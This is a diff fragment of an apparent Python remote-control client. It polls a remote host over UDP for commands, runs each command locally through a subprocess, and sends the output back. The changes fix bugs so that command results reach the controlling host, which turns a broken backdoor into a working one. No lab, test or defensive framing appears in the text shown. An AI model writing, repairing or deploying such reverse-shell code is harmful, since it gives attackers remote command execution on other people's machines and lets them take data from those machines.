@@ -24,9 +24,9 @@ if len(sys.argv) > 2:
 s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
 
 try:
-    MAKE_REQUEST = bytes('request')
-    FILENAME_REQUEST = bytes('name')
-    FILE_REQUEST = bytes('name')
+    MAKE_REQUEST = bytes('REQUEST', 'utf-8')
+    FILENAME_REQUEST = bytes('NAME', 'utf-8')
+    FILE_REQUEST = bytes('FILE', 'utf-8')
 
     while True:
         command = get_command(MAKE_REQUEST, s, REMOTE_HOST, REMOTE_PORT)
@@ -44,7 +44,7 @@ try:
             output = op.stdout.read()
             output_error = op.stderr.read()
             print("[-] Sending response...")
-            s.send(output + output_error)
+            s.sendto(output + output_error, (REMOTE_HOST, REMOTE_PORT))
 
 except ConnectionAbortedError:
     print("Connection severed")
